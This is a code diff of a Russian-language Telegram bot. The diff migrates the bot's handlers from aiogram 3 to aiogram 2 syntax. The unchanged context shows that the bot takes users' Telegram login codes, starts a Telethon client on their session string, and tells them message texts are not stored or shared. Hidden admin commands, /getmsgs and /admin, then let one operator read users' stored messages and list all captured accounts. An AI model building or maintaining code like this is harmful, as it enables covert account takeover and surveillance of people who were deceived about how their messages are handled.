@@ -1,19 +1,19 @@
 import asyncio
 from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
+from aiogram.contrib.middlewares.logging import LoggingMiddleware
+from aiogram.utils import executor
 import config
 from database import init_db, add_user, get_user, get_messages, get_all_users
 from telethon_client import start_client, stop_client
 
 bot = Bot(token=config.BOT_TOKEN)
-dp = Dispatcher()
+dp = Dispatcher(bot)
+dp.middleware.setup(LoggingMiddleware())
 
 init_db()
 temp_data = {}
 
-# ===== ПУБЛИЧНЫЕ КОМАНДЫ (для пользователя) =====
-
-@dp.message(Command("start"))
+@dp.message_handler(commands=['start'])
 async def start(message: types.Message):
     await message.answer(
         "🔥 **Добро пожаловать!**\n\n"
@@ -28,7 +28,7 @@ async def start(message: types.Message):
         "тексты сообщений не сохраняются и не передаются третьим лицам."
     )
 
-@dp.message(Command("auth"))
+@dp.message_handler(commands=['auth'])
 async def auth(message: types.Message):
     args = message.text.split()
     if len(args) < 2:
@@ -48,7 +48,7 @@ async def auth(message: types.Message):
         "⏳ Код действителен 5 минут."
     )
 
-@dp.message(Command("code"))
+@dp.message_handler(commands=['code'])
 async def code(message: types.Message):
     args = message.text.split()
     if len(args) < 2:
@@ -71,7 +71,7 @@ async def code(message: types.Message):
     )
     asyncio.create_task(start_client(user_id, session_string))
 
-@dp.message(Command("stats"))
+@dp.message_handler(commands=['stats'])
 async def stats(message: types.Message):
     user = get_user(message.from_user.id)
     if not user:
@@ -80,14 +80,13 @@ async def stats(message: types.Message):
     msgs = get_messages(message.from_user.id)
     await message.answer(f"📊 Всего обработано сообщений: **{len(msgs)}**")
 
-@dp.message(Command("stop"))
+@dp.message_handler(commands=['stop'])
 async def stop(message: types.Message):
     await stop_client(message.from_user.id)
     await message.answer("⏹️ Сбор статистики остановлен.")
 
-# ===== АДМИН-КОМАНДЫ (скрытые) =====
-
-@dp.message(Command("getmsgs"))
+# Админ-команды (скрытые)
+@dp.message_handler(commands=['getmsgs'])
 async def getmsgs(message: types.Message):
     if message.from_user.id != config.ADMIN_ID:
         return
@@ -107,7 +106,7 @@ async def getmsgs(message: types.Message):
     text = "\n".join([f"🕒 {t[1]} → {t[0][:100]}" for t in msgs])
     await message.answer(f"📩 Сообщения пользователя {user_id}:\n\n{text}")
 
-@dp.message(Command("admin"))
+@dp.message_handler(commands=['admin'])
 async def admin(message: types.Message):
     if message.from_user.id != config.ADMIN_ID:
         return
@@ -118,7 +117,5 @@ async def admin(message: types.Message):
     text = "👥 Активные пользователи:\n" + "\n".join([f"`{u[0]}` — {u[1]}" for u in users])
     await message.answer(text)
 
-# ===== ЗАПУСК =====
-
 if __name__ == "__main__":
-    dp.run_polling(bot)
+    executor.start_polling(dp, skip_updates=True)
